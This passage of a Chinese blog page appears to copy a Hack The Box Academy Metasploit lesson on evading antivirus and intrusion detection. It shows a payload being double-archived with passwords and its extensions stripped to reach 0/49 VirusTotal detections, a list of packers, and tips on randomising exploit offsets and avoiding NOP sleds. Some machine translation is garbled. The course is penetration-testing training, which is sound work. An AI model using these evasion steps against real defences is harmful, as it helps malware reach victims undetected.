20220510</span><br><span class="line"> Panda                 false     4.6.4.2                                                  20220509</span><br><span class="line"> Rising                false     25.0.0.27                                                20220510</span><br><span class="line"> SUPERAntiSpyware      false     5.6.0.1032                                               20220507</span><br><span class="line"> Sangfor               false     2.14.0.0                                                 20220507</span><br><span class="line"> Sophos                false     1.4.1.0                                                  20220510</span><br><span class="line"> Symantec              false     1.17.0.0                                                 20220510</span><br><span class="line"> TACHYON               false     2022-05-10.02                                            20220510</span><br><span class="line"> Tencent               false     1.0.0.1                                                  20220510</span><br><span class="line"> TrendMicro            false     11.0.0.1006                                              20220510</span><br><span class="line"> TrendMicro-HouseCall  false     10.0.0.1040                                              20220510</span><br><span class="line"> VBA32                 false     5.0.0                                                    20220506</span><br><span class="line"> ViRobot               false     2014.3.20.0                                              20220510</span><br><span class="line"> VirIT                 false     9.5.191                                                  20220509</span><br><span class="line"> Yandex                false     5.5.2.24                                                 20220428</span><br><span class="line"> Zillya                false     2.0.0.4627                                               20220509</span><br><span class="line"> ZoneAlarm             false     1.0                                                      20220510</span><br><span class="line"> Zoner                 false     2.2.2.0                                                  20220509</span><br></pre></td></tr></table></figure>

<p>现在，尝试将其存档两次，在创建时为两个存档都设置密码，并从它们的名称中删除<code>.rar</code>&#x2F; <code>.zip</code>&#x2F;<code>.7z</code>扩展名。为此，我们可以从 RARLabs 安装<a target="_blank" rel="noopener" href="https://www.rarlab.com/download.htm">RAR 实用程序</a>，它的工作方式与 Windows 上的 WinRAR 完全一样。</p>
<h4 id="存档有效负载"><a href="#存档有效负载" class="headerlink" title="存档有效负载"></a>存档有效负载</h4><p> 存档有效负载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz</span><br><span class="line">vnswer77@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz &amp;&amp; cd rar</span><br><span class="line">vnswer77@htb[/htb]$ rar a ~/test.rar -p ~/test.js</span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed): ******</span><br><span class="line">Reenter password: ******</span><br><span class="line"></span><br><span class="line">RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017</span><br><span class="line">Trial version             Type &#x27;rar -?&#x27; for help</span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Creating archive test.rar</span><br><span class="line">Adding    test.js                                                     OK </span><br><span class="line">Done</span><br></pre></td></tr></table></figure>

<p> 存档有效负载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test.js   test.rar</span><br></pre></td></tr></table></figure>

<h4 id="删除-RAR-扩展名"><a href="#删除-RAR-扩展名" class="headerlink" title="删除 .RAR 扩展名"></a>删除 .RAR 扩展名</h4><p> 删除 .RAR 扩展名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mv test.rar test</span><br><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test   test.js</span><br></pre></td></tr></table></figure>

<h4 id="再次归档有效负载"><a href="#再次归档有效负载" class="headerlink" title="再次归档有效负载"></a>再次归档有效负载</h4><p> 再次归档有效负载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ rar a test2.rar -p test</span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed): ******</span><br><span class="line">Reenter password: ******</span><br><span class="line"></span><br><span class="line">RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017</span><br><span class="line">Trial version             Type &#x27;rar -?&#x27; for help</span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Creating archive test2.rar</span><br><span class="line">Adding    test                                                        OK </span><br><span class="line">Done</span><br></pre></td></tr></table></figure>

<h4 id="删除-RAR-扩展名-1"><a href="#删除-RAR-扩展名-1" class="headerlink" title="删除 .RAR 扩展名"></a>删除 .RAR 扩展名</h4><p> 删除 .RAR 扩展名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ mv test2.rar test2</span><br><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">test   test2   test.js</span><br></pre></td></tr></table></figure>

<p>test2 文件是最终的 .rar 存档文件，其扩展名 (.rar) 从名称中删除。之后，我们可以继续将其上传到 VirusTotal 以进行另一次检查。</p>
<h4 id="病毒总数-1"><a href="#病毒总数-1" class="headerlink" title="病毒总数"></a>病毒总数</h4><p> 病毒总数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msf-virustotal -k &lt;API key&gt; -f test2</span><br><span class="line"></span><br><span class="line">[*] Using API key: &lt;API key&gt;</span><br><span class="line">[*] Please wait while I upload test2...</span><br><span class="line">[*] VirusTotal: Scan request successfully queued, come back later for the report</span><br><span class="line">[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d</span><br><span class="line">[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429</span><br><span class="line">[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad</span><br><span class="line">[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-1652167804</span><br><span class="line">[*] Requesting the report...</span><br><span class="line">[*] Received code 0. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Received code -2. Waiting for another 60 seconds...</span><br><span class="line">[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad</span><br><span class="line">=================================================================================================</span><br><span class="line"></span><br><span class="line"> Antivirus             Detected  Version         Result  Update</span><br><span class="line"> ---------             --------  -------         ------  ------</span><br><span class="line"> ALYac                 false     1.1.3.1                 20220510</span><br><span class="line"> Acronis               false     1.2.0.108               20220426</span><br><span class="line"> Ad-Aware              false     3.0.21.193              20220510</span><br><span class="line"> AhnLab-V3             false     3.21.3.10230            20220510</span><br><span class="line"> Antiy-AVL             false     3.0                     20220510</span><br><span class="line"> Arcabit               false     1.0.0.889               20220510</span><br><span class="line"> Avira                 false     8.3.3.14                20220510</span><br><span class="line"> BitDefender           false     7.2                     20220510</span><br><span class="line"> BitDefenderTheta      false     7.2.37796.0             20220428</span><br><span class="line"> Bkav                  false     1.3.0.9899              20220509</span><br><span class="line"> CAT-QuickHeal         false     14.00                   20220510</span><br><span class="line"> CMC                   false     2.10.2019.1             20211026</span><br><span class="line"> ClamAV                false     0.105.0.0               20220509</span><br><span class="line"> Comodo                false     34606                   20220509</span><br><span class="line"> Cynet                 false     4.0.0.27                20220510</span><br><span class="line"> Cyren                 false     6.5.1.2                 20220510</span><br><span class="line"> DrWeb                 false     7.0.56.4040             20220510</span><br><span class="line"> ESET-NOD32            false     25243                   20220510</span><br><span class="line"> Emsisoft              false     2021.5.0.7597           20220510</span><br><span class="line"> F-Secure              false     18.10.978.51            20220510</span><br><span class="line"> FireEye               false     35.24.1.0               20220510</span><br><span class="line"> Fortinet              false     6.2.142.0               20220510</span><br><span class="line"> Gridinsoft            false     1.0.77.174              20220510</span><br><span class="line"> Jiangmin              false     16.0.100                20220509</span><br><span class="line"> K7AntiVirus           false     12.12.42275             20220510</span><br><span class="line"> K7GW                  false     12.12.42275             20220510</span><br><span class="line"> Kingsoft              false     2017.9.26.565           20220510</span><br><span class="line"> Lionic                false     7.5                     20220510</span><br><span class="line"> MAX                   false     2019.9.16.1             20220510</span><br><span class="line"> Malwarebytes          false     4.2.2.27                20220510</span><br><span class="line"> MaxSecure             false     1.0.0.1                 20220510</span><br><span class="line"> McAfee-GW-Edition     false     v2019.1.2+3728          20220510</span><br><span class="line"> MicroWorld-eScan      false     14.0.409.0              20220510</span><br><span class="line"> NANO-Antivirus        false     1.0.146.25588           20220510</span><br><span class="line"> Panda                 false     4.6.4.2                 20220509</span><br><span class="line"> Rising                false     25.0.0.27               20220510</span><br><span class="line"> SUPERAntiSpyware      false     5.6.0.1032              20220507</span><br><span class="line"> Sangfor               false     2.14.0.0                20220507</span><br><span class="line"> Symantec              false     1.17.0.0                20220510</span><br><span class="line"> TACHYON               false     2022-05-10.02           20220510</span><br><span class="line"> Tencent               false     1.0.0.1                 20220510</span><br><span class="line"> TrendMicro-HouseCall  false     10.0.0.1040             20220510</span><br><span class="line"> VBA32                 false     5.0.0                   20220506</span><br><span class="line"> ViRobot               false     2014.3.20.0             20220510</span><br><span class="line"> VirIT                 false     9.5.191                 20220509</span><br><span class="line"> Yandex                false     5.5.2.24                20220428</span><br><span class="line"> Zillya                false     2.0.0.4627              20220509</span><br><span class="line"> ZoneAlarm             false     1.0                     20220510</span><br><span class="line"> Zoner                 false     2.2.2.0                 20220509</span><br></pre></td></tr></table></figure>

<p><code>to</code>正如我们从上面看到的那样，这是一种在目标主机和目标主机之间传输数据的好方法<code>from</code>。</p>
<hr>
<h2 id="包装工"><a href="#包装工" class="headerlink" title="包装工"></a>包装工</h2><p>该术语指的是有效负载与可执行程序和解压缩代码一起打包在一个文件中的过程<code>Packer</code>的结果。<code>executable compression</code>运行时，解压缩代码将后门可执行文件返回到其原始状态，从而为目标主机上的文件扫描机制提供另一层保护。此过程透明地发生，以便压缩的可执行文件以与原始可执行文件相同的方式运行，同时保留所有原始功能。此外，msfvenom 还提供压缩和更改后门可执行文件的文件结构以及加密底层进程结构的能力。</p>
<p>流行的加壳软件列表：</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://upx.github.io/">UPX封隔器</a></td>
<td><a target="_blank" rel="noopener" href="https://enigmaprotector.com/">谜保护者</a></td>
<td><a target="_blank" rel="noopener" href="https://www.matcode.com/mpress.htm">国会议员</a></td>
</tr>
<tr>
<td>备用 EXE 打包程序</td>
<td>执行隐身</td>
<td>吗啡</td>
</tr>
<tr>
<td>水电部</td>
<td>泰米达</td>
<td></td>
</tr>
</tbody></table>
<p>如果我们想了解有关打包器的更多信息，请查看<a target="_blank" rel="noopener" href="https://jon.oberheide.org/files/woot09-polypack.pdf">PolyPack 项目</a>。</p>
<hr>
<h2 id="利用编码"><a href="#利用编码" class="headerlink" title="利用编码"></a>利用编码</h2><p>在编写我们的漏洞利用程序或将预先存在的漏洞利用程序移植到框架时，最好确保利用目标系统上实施的安全措施不容易识别漏洞利用代码。</p>
<p>例如，<code>Buffer Overflow</code>由于其十六进制缓冲区模式，典型的漏洞可能很容易与通过网络传输的常规流量区分开来。IDS &#x2F; IPS 部署可以检查流向目标机器的流量，并注意到用于利用代码的特定过度使用模式。</p>
<p>在组装我们的漏洞利用代码时，随机化有助于为这些模式添加一些变化，这将破坏众所周知的漏洞利用缓冲区的 IPS &#x2F; IDS 数据库签名。<code>Offset</code>这可以通过在 msfconsole 模块的代码中输入一个开关来完成：</p>
<p>代号：红宝石</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;Targets&#x27;</span> =&gt;</span><br><span class="line">[</span><br><span class="line"> 	[ <span class="string">&#x27;Windows 2000 SP4 English&#x27;</span>, &#123; <span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x77e14c29</span>, <span class="string">&#x27;Offset&#x27;</span> =&gt; <span class="number">5093</span> &#125; ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure>

<p>除了 BoF 代码之外，应该始终避免使用明显的 NOP sled，在溢出完成后 shellcode 应该着陆的地方。请注意，BoF 代码的目的是使目标机器上运行的服务崩溃，而 NOP sled 是插入我们的 shellcode（有效负载）的分配内存。IPS&#x2F;IDS 实体会定期检查这两者，因此最好在将我们的自定义漏洞代码部署到客户端网络之前针对沙箱环境测试它。当然，我们可能只有一次机会在评估期间正确地做到这一点。</p>
<p>有关利用代码的更多信息，我们建议您查看No Starch 出版社的<a target="_blank" rel="noopener" href="https://nostarch.com/metasploit">Metasploit - 渗透测试指南。</a>他们深入研究了有关为框架创建漏洞的一些细节。</p>
<hr>
<h2 id="从源代码重新编译-Meterpreter"><a href="#从源代码重新编译-Meterpreter" class="headerlink" title="从源代码重新编译 Meterpreter"></a>从源代码重新编译 Meterpreter</h2><p>入侵防御系统和防病毒引擎是最常见的防御工具，可以击落目标的初始立足点。这些主要作用于整个恶意文件或存根阶段的签名。</p>
<hr>
<h2 id="关于逃避的注意事项"><a href="#关于逃避的注意事项" class="headerlink" title="关于逃避的注意事项"></a>关于逃避的注意事项</h2><p>本节涵盖高级别的规避。请留意后面的模块，这些模块将更深入地挖掘更有效地执行规避所需的理论和实践知识。值得在较旧的 HTB 机器上尝试其中的一些技术，或者安装带有较旧版本的 Windows Defender 或免费 AV 引擎的 VM，并练习规避技巧。这是一个庞大的主题，无法在单个部分中充分涵盖。</p>
<p><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/418">以前的</a>标记完成和下一步<a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/493">下一个</a></p>
<p>备忘单</p>
<h5 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h5><h6 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h6><p><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/381">前言</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/383">Metasploit简介</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/384">MSF控制台介绍</a></p>
<h6 id="MSF-组件"><a href="#MSF-组件" class="headerlink" title="MSF 组件"></a>MSF 组件</h6><p><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/404"> 模块</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/408">目标</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/407"> 有效载荷</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/409">编码器</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/411">数据库</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/413">插件和混合</a></p>
<h6 id="无国界医生会议"><a href="#无国界医生会议" class="headerlink" title="无国界医生会议"></a>无国界医生会议</h6><p><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/415"> 会议和工作</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/414"> 计价器</a></p>
<h6 id="附加功能"><a href="#附加功能" class="headerlink" title="附加功能"></a>附加功能</h6><p><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/417">编写和导入模块</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/418">MSF毒液简介</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/416">防火墙和 IDS&#x2F;IPS 规避</a><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/493">Metasploit 框架更新 - 2020 年 8 月</a></p>
<h5 id="我的工作站"><a href="#我的工作站" class="headerlink" title="我的工作站"></a>我的工作站</h5><h1 id="Metasploit-框架更新-2020-年-8-月"><a href="#Metasploit-框架更新-2020-年-8-月" class="headerlink" title="Metasploit 框架更新 - 2020 年 8 月"></a>Metasploit 框架更新 - 2020 年 8 月</h1><hr>
<p>更新到 MSF6 将使所有以前的负载会话无法使用（如果它们是使用 MSF5 建立的）。此外，使用 MSF5 生成的有效负载将不适用于 MSF6 通信机制。我们在下面总结了 2020 年 8 月 MSF 控制台更新带来的更改和添加。</p>
<hr>
<h2 id="生成特征"><a href="#生成特征" class="headerlink" title="生成特征"></a>生成特征</h2><ul>
<li>所有五种实现（Windows、Python、Java、Mettle 和 PHP）的跨 Meterpreter 会话的端到端加密</li>
<li>SMBv3 客户端支持以进一步启用现代开发工作流程</li>
<li>Windows shellcode 的新多态负载生成例程，可提高针对常见防病毒和入侵检测系统 (IDS) 产品的规避能力</li>
</ul>
<hr>
<h2 id="扩展加密"><a href="#扩展加密" class="headerlink" title="扩展加密"></a>扩展加密</h2><ul>
<li>为某些网络操作和 Metasploit 的主要有效载荷二进制文件创建基于签名的检测的复杂性增加</li>
<li>在攻击者和目标系统之间的通信期间，所有 Meterpreter 有效负载将使用 AES 加密</li>
<li>SMBv3 加密集成将增加用于识别通过 SMB 执行的关键操作的基于签名的检测的复杂性</li>
</ul>
<hr>
<h2 id="更清洁的有效载荷工件"><a href="#更清洁的有效载荷工件" class="headerlink" title="更清洁的有效载荷工件"></a>更清洁的有效载荷工件</h2><ul>
<li>Windows Meterpreter 使用的 DLL 现在通过序号而不是名称解析必要的函数</li>
<li>反射加载 DLL 使用的标准导出 ReflectiveLoader 不再作为文本数据出现在负载二进制文件中</li>
<li>Meterpreter 向框架公开的命令现在被编码为整数而不是字符串</li>
</ul>
<hr>
<h2 id="插件-2"><a href="#插件-2" class="headerlink" title="插件"></a>插件</h2><p>旧的 Mimikatz Meterpreter 扩展被移除，取而代之的是它的继任者 Kiwi。因此，在可预见的未来，加载 Mimikatz 的尝试将加载 Kiwi。</p>
<hr>
<h2 id="有效载荷-1"><a href="#有效载荷-1" class="headerlink" title="有效载荷"></a>有效载荷</h2><p>将 shellcode 静态生成例程替换为随机化例程，该例程通过每次随机化指令向该关键存根添加多态属性。要阅读有关这些更改的更多信息并查看完整的更改日志，请<a target="_blank" rel="noopener" href="https://blog.rapid7.com/2020/08/06/metasploit-6-now-under-active-development/">点击此链接</a>。</p>
<hr>
<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>正如我们在本模块中看到的，Metasploit 是一个强大的框架。虽然经常被误用和贴错标签，但如果使用得当，它可以成为我们渗透测试武器库的重要组成部分。它具有高度可扩展性，非常适合在评估期间跟踪数据，并且非常适合后期开发和促进枢转。值得尝试 Metasploit 提供的所有功能；您可能会找到一种非常适合您的工作流程的方式。如果你想避免它，那也没关系！那里有很多工具，我们应该使用我们最熟悉的工具。要使用此工具进行更多练习，请查看本模块末尾标记的 HTB 盒子，或使用 Metasploit 尝试任何盒子或 Academy 模块目标。您还可以在 Dante Pro Lab 中练习它（尤其是它的旋转能力）。</p>
<p><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/39/section/416">以前的</a>结束</p>
<p>备忘单</p>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
    </div>
</article>


<p>
    <a  class="dashang" onclick="dashangToggle()">💰</a>
</p>






    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©2016-2023 answer77
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close"  onclick="dashangToggle()">×</a>
    <div class="shang_tit">
        <p>Help us with donation</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">alipay</label></span><span><label><input type="radio" name="pay" value="weixin">weixin</label></span>
    </div>
</div>


</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 672px;
    }
    .nav.fullscreen {
        margin-left: -672px;
    }
    .nav-left {
        width: 250px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 572px;
        }
        .nav.fullscreen {
            margin-left: -572px;
        }
        .nav-left {
            width: 180px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 572px;
            margin-left: -572px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    #post {
        background: url(/img/3.png);
    }
    
    
    #post .index {
        background: url(/img/3.png);
    }
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.5;
        background: url("/img/2.png");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







</html>
